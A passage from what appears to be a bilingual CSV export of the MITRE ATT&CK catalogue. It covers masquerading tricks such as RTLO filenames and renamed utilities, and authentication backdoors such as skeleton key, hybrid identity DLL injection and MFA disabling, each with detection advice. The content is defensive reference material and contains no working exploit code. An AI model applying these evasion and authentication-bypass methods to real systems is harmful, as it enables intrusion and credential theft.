Oct 2019),(Citation: ASERT InnaputRAT April 2018),(Citation: Check Point Meteor Aug 2021),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: Symantec Catchamas April 2018),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Symantec Orangeworm April 2018),(Citation: TrendMicro RawPOS April 2015),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Fysbis Dr Web Analysis),(Citation: Malwarebytes Konni Aug 2021),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Kaspersky Carbanak),",伪装：伪装任务或服务,攻击者可能会尝试操纵任务或服务的名称，使其看起来合法或良性。由任务计划程序或 systemd 执行的任务/服务通常会被赋予名称和/或描述。（引用：TechNet Schtasks）（引用：Systemd 服务单元）Windows 服务将具有服务名称和显示名称。存在许多具有共同关联名称的良性任务和服务。攻击者可能会给出与合法任务或服务相似或相同的名称。任务或服务包含攻击者可能试图使其看起来合法的其他字段，例如描述。（引用：Palo Alto Shamoon Nov 2016）（引用：Fysbis Dr Web Analysis）
T1036.005,Masquerading: Match Legitimate Name or Location,"Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.

Adversaries may also use the same icon of the file they are trying to mimic.",https://attack.mitre.org/techniques/T1036/005,10 February 2020,05 May 2022,1.1,Defense Evasion,"Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.

If file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Elastic Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)

In containerized environments, use image IDs and layer hashes to compare images instead of relying only on their names.(Citation: Docker Images) Monitor for the unexpected creation of new resources within your cluster in Kubernetes, especially those created by atypical users.","Containers, Linux, Windows, macOS","File: File Metadata, Image: Image Metadata, Process: Process Metadata",True,T1036,Application Control,"Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team",,,,CAPEC-177,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: Unit 42 MechaFlounder March 2019),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: Volexity SolarWinds),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: IBM Grandoreiro April 2020),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: FoxIT Wocao December 2019),(Citation: Symantec Tick Apr 2016),(Citation: ESET Hermetic Wizard March 2022),(Citation: Securelist Octopus Oct 2018),(Citation: Symantec Whitefly March 2019),(Citation: FinFisher Citation),(Citation: Symantec RAINDROP January 2021),(Citation: Carbon Black Shlayer Feb 2019),(Citation: Symantec Remsec IOCs),(Citation: Talos Promethium June 2020),(Citation: ESET Lazarus Jun 2020),(Citation: Bitdefender StrongPity June 2020),(Citation: wardle evilquest partii),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Cybereason Bazar July 2020),(Citation: Volexity Patchwork June 2018),(Citation: Cybereason Chaes Nov 2020),(Citation: Trusteer Carberp October 2010),(Citation: Medium Metamorfo Apr 2020),(Citation: KISA Operation Muzabi),(Citation: ASERT InnaputRAT April 2018),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: FireEye admin@338),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: ESET LightNeuron May 2019),(Citation: Rewterz Sidewinder COVID-19 June 2020),(Citation: Kaspersky Carbanak),(Citation: ESET Sednit USBStealer 2014),(Citation: Unit 42 NOKKI Sept 2018),(Citation: Guidepoint SUPERNOVA Dec 2020),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: McAfee Cuba April 2021),(Citation: McAfee Sharpshooter December 2018),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Trustwave GoldenSpy June 2020),(Citation: ESET Bad Rabbit),(Citation: Tarrask scheduled task),(Citation: reed thiefquest ransomware analysis),(Citation: Unit 42 BackConfig May 2020),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: ESET PipeMon May 2020),(Citation: FBI FLASH APT39 September 2020),(Citation: Cybereason StrifeWater Feb 2022),(Citation: Securelist Calisto July 2018),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Malwarebytes Pony April 2016),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Talos Bisonal Mar 2020),(Citation: FireEye APT28),(Citation: Cybereason Kimsuky November 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Antiy CERT Ramsay April 2020),(Citation: 360 Machete Sep 2020),(Citation: TrendMicro Ursnif Mar 2015),(Citation: Microsoft DTC),(Citation: Recorded Future REDDELTA July 2020),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Intego Shlayer Feb 2018),(Citation: Cymmetria Patchwork),(Citation: Kaspersky Poseidon Group),(Citation: PaloAlto Patchwork Mar 2018),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: CERT-FR PYSA April 2020),(Citation: Prevx Carberp March 2011),(Citation: McAfee Honeybee),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ESET Grandoreiro April 2020),(Citation: Talos Konni May 2017),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: Red Canary NETWIRE January 2020),(Citation: Baumgartner Naikon 2015),(Citation: Kaspersky ProjectSauron Full Report),(Citation: Cisco Talos Intelligence Group),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Cylance Dust Storm),(Citation: Eset Ramsay May 2020),(Citation: Proofpoint TA416 Europe March 2022),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Trend Micro IXESHE 2012),(Citation: Morphisec ShellTea June 2019),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Talos MuddyWater May 2019),(Citation: SentinelOne NobleBaron June 2021),(Citation: Crowdstrike Indrik November 2018),(Citation: Cycraft Chimera April 2020),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Microsoft NICKEL December 2021),(Citation: Picus Sodinokibi January 2020),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Symantec Sowbug Nov 2017),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Talos Rocke August 2018),(Citation: NCC Group Team9 June 2020),(Citation: Group IB APT 41 June 2021),(Citation: Unit42 SUPERNOVA Dec 2020),(Citation: Lotus Blossom Jun 2015),(Citation: NCSC Cyclops Blink February 2022),(Citation: BitDefender Chafer May 2020),(Citation: ESET InvisiMole June 2020),(Citation: ESET InvisiMole June 2018),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: CrowdStrike IceApple May 2022),(Citation: FireEye MuddyWater Mar 2018),(Citation: Unit 42 Gamaredon February 2022),(Citation: Dragos EKANS),(Citation: FOX-IT May 2016 Mofang),(Citation: Group IB Silence Sept 2018),(Citation: ZScaler Hacking Team),(Citation: MacKeeper Bundlore Apr 2019),(Citation: ESET Telebots Dec 2016),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Securelist Machete Aug 2014),(Citation: Trend Micro Skidmap),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Fysbis Dr Web Analysis),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Talos TinyTurla September 2021),(Citation: Intezer Doki July 20),(Citation: CyberBit Dtrack),(Citation: TrendMicro DarkComet Sept 2014),(Citation: CrowdStrike Ryuk January 2019),(Citation: ESET Gelsemium June 2021),(Citation: Mandiant APT1),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Forcepoint Felismus Mar 2017),(Citation: Leonardo Turla Penquin May 2020),(Citation: Microsoft DUBNIUM June 2016),(Citation: ClearSky Siamesekitten August 2021),(Citation: Secure List Bad Rabbit),(Citation: RedCanary Mockingbird May 2020),(Citation: MSTIC FoggyWeb September 2021),(Citation: Qualys LolZarus),(Citation: ESET Machete July 2019),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Volexity Ocean Lotus November 2020),(Citation: Microsoft Winnti Jan 2017),(Citation: TrendMicro EarthLusca 2022),(Citation: Kaspersky WIRTE November 2021),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: FireEye APT41 Aug 2019),(Citation: ESET Casbaneiro Oct 2019),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Dell TG-3390),(Citation: Anomali Static Kitten February 2021),(Citation: ESET Nomadic Octopus 2018),(Citation: ClearSky Lazarus Aug 2020),(Citation: Unit42 RDAT July 2020),(Citation: Bitdefender Naikon April 2021),(Citation: Mandiant APT1 Appendix),(Citation: FireEye TRITON 2019),(Citation: Secureworks MCMD July 2019),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Microsoft FinFisher March 2018),",伪装：匹配合法名称或位置,在命名/放置合法文件或资源时，攻击者可能会匹配或近似其名称或位置。这样做是为了逃避防御和观察。这可以通过将可执行文件放在通常受信任的目录中（例如：在 System32 下）或为其指定合法、受信任的程序的名称（例如：svchost.exe）来完成。在容器化环境中，这也可以通过在与容器 pod 或集群的命名约定匹配的命名空间中创建资源来完成。或者，给定的文件或容器映像名称可能非常接近合法程序/映像或一些无害的东西。攻击者也可能使用他们试图模仿的文件的相同图标。
T1036.003,Masquerading: Rename System Utilities,Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing. (Citation: LOLBAS Main Site) It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <code>rundll32.exe</code>). (Citation: Elastic Masquerade Ball) An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths. (Citation: F-Secure CozyDuke),https://attack.mitre.org/techniques/T1036/003,10 February 2020,23 November 2020,1.0,Defense Evasion,"If file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Elastic Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)","Linux, Windows, macOS","Command: Command Execution, File: File Metadata, File: File Modification, Process: Process Metadata",True,T1036,,,,,,,,,"(Citation: F-Secure CozyDuke),(Citation: FireEye APT10 Sept 2018),(Citation: Twitter ItsReallyNick APT32 pubprn Masquerade),(Citation: Kaspersky Lyceum October 2021),(Citation: Cybereason Soft Cell June 2019),(Citation: Qualys LolZarus),",伪装：重命名系统实用程序,攻击者可能会重命名合法的系统实用程序，以试图规避有关这些实用程序使用的安全机制。安全监视和控制机制可能适用于攻击者能够滥用的系统实用程序。 （引用：LOLBAS 主站点）通过在使用之前重命名实用程序（例如：重命名 <code>rundll32.exe</code>），可以绕过这些安全机制。 （引用：Elastic Masquerade Ball）另一种情况是，将合法实用程序复制或移动到不同目录并重命名以避免基于从非标准路径执行的系统实用程序的检测。 （引用：F-Secure CozyDuke）
T1036.002,Masquerading: Right-to-Left Override,"Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named <code>March 25 \u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>.(Citation: Infosecinstitute RTLO Technique)

Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)/[Malicious File](https://attack.mitre.org/techniques/T1204/002) since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.",https://attack.mitre.org/techniques/T1036/002,10 February 2020,14 October 2021,1.1,Defense Evasion,"Detection methods should include looking for common formats of RTLO characters within filenames such as <code>\u202E</code>, <code>[U+202E]</code>, and <code>%E2%80%AE</code>. Defenders should also check their analysis tools to ensure they do not interpret the RTLO character and instead print the true name of the file containing it.","Linux, Windows, macOS",File: File Metadata,True,T1036,,,,,,,,,"(Citation: TrendMicro BlackTech June 2017),(Citation: Scarlet Mimic Jan 2016),(Citation: Trend Micro Tick November 2019),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Kaspersky Ferocious Kitten Jun 2021),",伪装：从右到左覆盖,攻击者可能会滥用从右到左的覆盖（RTLO 或 RLO）字符 (U+202E) 来伪装字符串和/或文件名，使其看起来是良性的。 RTLO 是一个非打印的 Unicode 字符，它会导致后面的文本反向显示。例如，名为 <code>March 25 \u202Excod.scr</code> 的 Windows 屏幕保护程序可执行文件将显示为 <code>March 25 rcs.docx</code>。名为 <code>photo_high_re\u202Egnp.js</code> 的 JavaScript 文件将显示为 <code>photo_high_resj.png</code>。（引用：Infosecinstitute RTLO 技术）攻击者可能滥用 RTLO 字符作为欺骗用户执行他们认为是良性文件类型的文件。这种技术的常见用途是使用 [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)/[Malicious File](https://attack.mitre.org/techniques/T1204/002 ) 因为如果最终用户和防御者不知道他们的工具如何显示和渲染 RTLO 字符，它可能会欺骗他们。在许多有针对性的入侵企图和犯罪活动中都看到了 RTLO 字符的使用。（引用：趋势科技 PLEAD RTLO）（引用：卡巴斯基 RTLO 网络犯罪） RTLO 也可以在 Windows 注册表中使用，其中 regedit.exe 显示反转字符，但命令行工具 reg.exe 默认情况下不会。
T1036.006,Masquerading: Space after Filename,"Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.

For example, if there is a Mach-O executable file called <code>evil.bin</code>, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to <code>evil.txt</code>, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to <code>evil.txt </code> (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed (Citation: Mac Backdoors are back).

Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.",https://attack.mitre.org/techniques/T1036/006,10 February 2020,29 March 2020,1.0,Defense Evasion,"It's not common for spaces to be at the end of filenames, so this is something that can easily be checked with file monitoring. From the user's perspective though, this is very hard to notice from within the Finder.app or on the command-line in Terminal.app. Processes executed from binaries containing non-standard extensions in the filename are suspicious.","Linux, macOS",File: File Metadata,True,T1036,,"Erye Hernandez, Palo Alto Networks",User,,,CAPEC-649,,,"(Citation: synack 2016 review),",伪装：文件名后的空格,攻击者可以通过更改文件的扩展名来隐藏程序的真实文件类型。对于某些文件类型（特别是这不适用于 .app 扩展名），在文件名末尾附加一个空格将改变操作系统处理文件的方式。例如，如果有一个名为 <code>evil.bin</code> 的 Mach-O 可执行文件，当它被用户双击时，它会启动 Terminal.app 并执行。如果将此文件重命名为 <code>evil.txt</code>，则当用户双击时，它将使用默认的文本编辑应用程序启动（不执行二进制文件）。但是，如果将文件重命名为 <code>evil.txt </code>（注意末尾的空格），那么当用户双击时，真正的文件类型由操作系统确定并适当处理，二进制文件将被执行（引用：Mac 后门又回来了）。攻击者可以使用此功能诱骗用户双击任何格式的良性文件并最终执行恶意操作。
T1556,Modify Authentication Process,"Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).

Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",https://attack.mitre.org/techniques/T1556,11 February 2020,18 October 2022,2.2,"Credential Access, Defense Evasion, Persistence","Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages</code>) and correlate then investigate the DLL files these files reference. 

Password filters will also show up as an autorun and loaded DLL in lsass.exe.(Citation: Clymb3r Function Hook Passwords Sept 2013)

Monitor for calls to <code>OpenProcess</code> that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll).(Citation: Dell Skeleton) 

Monitor PAM configuration and module paths (ex: <code>/etc/pam.d/</code>) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.

Monitor for suspicious additions to the /Library/Security/SecurityAgentPlugins directory.(Citation: Xorrior Authorization Plugins)

Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services. (Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).

Monitor property changes in Group Policy that manage authentication mechanisms (i.e. [Group Policy Modification](https://attack.mitre.org/techniques/T1484/001)). The <code>Store passwords using reversible encryption</code> configuration should be set to Disabled. Additionally, monitor and/or block suspicious command/script execution of <code>-AllowReversiblePasswordEncryption $true</code>, <code>Set-ADUser</code> and <code>Set-ADAccountControl</code>. Finally, monitor Fine-Grained Password Policies and regularly audit user accounts and group settings.(Citation: dump_pwd_dcsync)
","Azure AD, Google Workspace, IaaS, Linux, Network, Office 365, SaaS, Windows, macOS","Active Directory: Active Directory Object Modification, Application Log: Application Log Content, File: File Creation, File: File Modification, Logon Session: Logon Session Creation, Module: Module Load, Process: OS API Execution, Process: Process Access, User Account: User Account Authentication, User Account: User Account Modification, Windows Registry: Windows Registry Key Modification",False,,,Chris Ross @xorrior,,,,,,,"(Citation: ESET Ebury Feb 2014),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: ESET ForSSHe December 2018),(Citation: TechNet Credential Theft),(Citation: TechNet Least Privilege),(Citation: Mandiant Azure AD Backdoors),(Citation: Microsoft LSA),(Citation: MagicWeb),(Citation: store_pwd_rev_enc),(Citation: Microsoft Securing Privileged Access)",修改认证过程/修改身份验证流程,攻击者可能会修改身份验证机制和流程以访问用户凭证或启用对帐户的其他无根据的访问。身份验证过程由机制处理，例如 Windows 上的本地安全身份验证服务器 (LSASS) 进程和安全帐户管理器 (SAM)，基于 Unix 的系统上的可插拔身份验证模块 (PAM)，以及 MacOS 系统上的授权插件，负责用于收集、存储和验证凭据。通过修改身份验证过程，攻击者可以在不使用 [有效帐户] (https://attack.mitre.org/techniques/T1078) 的情况下对服务或系统进行身份验证。攻击者可能会恶意修改此过程的一部分以泄露凭据或绕过身份验证机制。受损的凭据或访问权限可用于绕过对网络内系统上各种资源的访问控制，甚至可用于对远程系统和外部可用服务（如 VPN、Outlook Web Access 和远程桌面）的持久访问。
T1556.001,Modify Authentication Process: Domain Controller Authentication,"Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. 

Malware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user’s account and/or credentials (ex: [Skeleton Key](https://attack.mitre.org/software/S0007)). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.(Citation: Dell Skeleton)",https://attack.mitre.org/techniques/T1556/001,11 February 2020,20 April 2021,2.0,"Credential Access, Defense Evasion, Persistence","Monitor for calls to <code>OpenProcess</code> that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll).(Citation: Dell Skeleton)

Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g. a user has an active login session but has not entered the building or does not have VPN access). ",Windows,"File: File Modification, Logon Session: Logon Session Creation, Process: OS API Execution, Process: Process Access",True,T1556,,,Administrator,,,,,,"(Citation: Dell Skeleton),(Citation: Cycraft Chimera April 2020),(Citation: TechNet Least Privilege),(Citation: TechNet Credential Theft),(Citation: Microsoft LSA),(Citation: Microsoft Securing Privileged Access)",修改认证过程/修改身份验证流程：域控制器认证,攻击者可能会修补域控制器上的身份验证过程以绕过典型的身份验证机制并启用对帐户的访问。恶意软件可用于将虚假凭据注入域控制器上的身份验证过程，以创建用于访问任何用户帐户和/或凭据的后门（例如：[万能钥匙]（https://attack.mitre.org） /软件/S0007))。万能密钥通过企业域控制器身份验证过程 (LSASS) 上的一个补丁来工作，其中包含攻击者可能用来绕过标准身份验证系统的凭据。修补后，攻击者可以使用注入的密码成功地验证为任何域用户帐户（直到通过重新启动域控制器从内存中删除万能密钥）。经过身份验证的访问可以在单因素身份验证环境中不受限制地访问主机和/或资源。（引用：Dell Skeleton）
T1556.007,Modify Authentication Process: Hybrid Identity,"Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.  

Many organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Azure AD includes three options for synchronizing identities between Active Directory and Azure AD(Citation: Azure AD Hybrid Identity):

* Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Azure AD, allowing authentication to Azure AD to take place entirely in the cloud 
* Pass Through Authentication (PTA), in which Azure AD authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory 
* Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Azure AD 

AD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users’ identity and privileges. 

By modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService` process that authorizes all attempts to authenticate to Azure AD, as well as records user credentials.(Citation: Azure AD Connect for Read Teamers)(Citation: AADInternals Azure AD On-Prem to Cloud) In environments using AD FS, an adversary may edit the `Microsoft.IdentityServer.Servicehost` configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.(Citation: MagicWeb)

In some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Azure AD tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Azure AD environment as any user.(Citation: Mandiant Azure AD Backdoors)",https://attack.mitre.org/techniques/T1556/007,28 September 2022,21 October 2022,1.0,"Credential Access, Defense Evasion, Persistence",,"Azure AD, Google Workspace, IaaS, Office 365, SaaS, Windows","Application Log: Application Log Content, File: File Modification, Logon Session: Logon Session Creation, Module: Module Load",True,T1556,,Praetorian,,,,,,,"(Citation: MagicWeb),(Citation: AADInternals Azure AD On-Prem to Cloud),(Citation: MagicWeb),(Citation: Mandiant Azure AD Backdoors)",修改认证过程/修改身份验证流程：混合身份,攻击者可能会修补、修改或以其他方式使用与本地用户身份相关的后门云身份验证过程，以绕过典型的身份验证机制、访问凭据并启用对帐户的持久访问。许多组织维护在本地和基于云的环境之间共享的混合用户和设备身份。这些可以通过多种方式进行维护。例如，Azure AD 包括三个用于在 Active Directory 和 Azure AD 之间同步身份的选项（引用：Azure AD 混合身份）： * 密码哈希同步 (PHS)，其中特权本地帐户在 Active Directory 和 Azure AD 之间同步用户密码哈希Azure AD，允许对 Azure AD 的身份验证完全在云中进行 * 直通身份验证 (PTA)，其中 Azure AD 身份验证尝试被转发到本地 PTA 代理，该代理根据 Active Directory 验证凭据 * Active Directory 联合服务 (AD FS)，在 Active Directory 和 Azure AD FS 之间建立信任关系 AD FS 也可以与其他 SaaS 和云平台一起使用，例如 AWS 和 GCP，它将身份验证过程移交给 AD FS 并接收包含混合用户身份和权限的令牌。通过修改与混合身份相关的身份验证过程，攻击者可能能够建立对云资源的持久特权访问。例如，攻击运行 PTA 代理的本地服务器的攻击者可能会将恶意 DLL 注入“AzureADConnectAuthenticationAgentService”进程，该进程授权所有尝试向 Azure AD 进行身份验证，并记录用户凭据。（引用：Azure AD Connect for阅读 Teamers）（引用：AADInternals Azure AD On-Prem to Cloud）在使用 AD FS 的环境中，攻击者可能会编辑“Microsoft.IdentityServer.Servicehost”配置文件以加载恶意 DLL，该 DLL 会为具有任何集合的任何用户生成身份验证令牌声明，从而绕过多因素身份验证和定义的 AD FS 策略。（引用：MagicWeb）在某些情况下，攻击者可能能够从云修改混合身份身份验证过程。例如，在 Azure AD 租户中破坏全局管理员帐户的攻击者可能能够通过 Web 控制台注册新的 PTA 代理，同样允许他们获取凭据并以任何用户身份登录到 Azure AD 环境。（引文：Mandiant Azure AD 后门）
T1556.006,Modify Authentication Process: Multi-Factor Authentication,"Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.

Once adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621), adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.(Citation: Mandiant APT42)(Citation: Azure AD Conditional Access Exclusions)

For example, modifying the Windows hosts file (`C:\windows\system32\drivers\etc\hosts`) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a ""fail open"" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA. (Citation: Russians Exploit Default MFA Protocol - CISA March 2022) 

Depending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.(Citation: Russians Exploit Default MFA Protocol - CISA March 2022) ",https://attack.mitre.org/techniques/T1556/006,31 May 2022,21 October 2022,1.0,"Credential Access, Defense Evasion, Persistence",,"Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Active Directory: Active Directory Object Modification, Logon Session: Logon Session Creation, User Account: User Account Authentication, User Account: User Account Modification",True,T1556,Multi-Factor Authentication,"Liran Ravich, CardinalOps",,,,,,,",",修改认证过程/修改身份验证流程：多因素认证,攻击者可能会禁用或修改多因素身份验证 (MFA) 机制，以启用对受损帐户的持久访问。一旦攻击者通过破坏缺少 MFA 的帐户或通过使用 MFA 绕过方法（例如 [Multi-Factor Authentication Request Generation] (https://attack.mitre.org/techniques/T1621)）来访问网络，攻击者可能利用他们的访问权限来修改或完全禁用 MFA 防御。这可以通过滥用合法功能来实现，例如从 Azure AD 条件访问策略中排除用户、注册一个新的但易受攻击/攻击者控制的 MFA 方法，或者通过手动修补 MFA 程序和配置文件以绕过预期的功能。（引用：Mandiant APT42)（引用：Azure AD 条件访问排除）例如，修改 Windows 主机文件（`C:\windows\system32\drivers\etc\hosts`）以将 MFA 调用重定向到 localhost 而不是 MFA 服务器可能会导致 MFA过程失败。如果实施了“失败开放”策略，则任何其他成功的身份验证尝试都可以被授予访问权限，而无需强制执行 MFA。 （引文：俄罗斯人利用默认 MFA 协议 - CISA 2022 年 3 月）根据对手的范围、目标和特权，可能会为个人帐户或与更大组关联的所有帐户禁用 MFA 防御，例如在受害者的网络环境。（引用：俄罗斯人利用默认 MFA 协议 - CISA 2022 年 3 月）
T1556.004,Modify Authentication Process: Network Device Authentication,"Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.

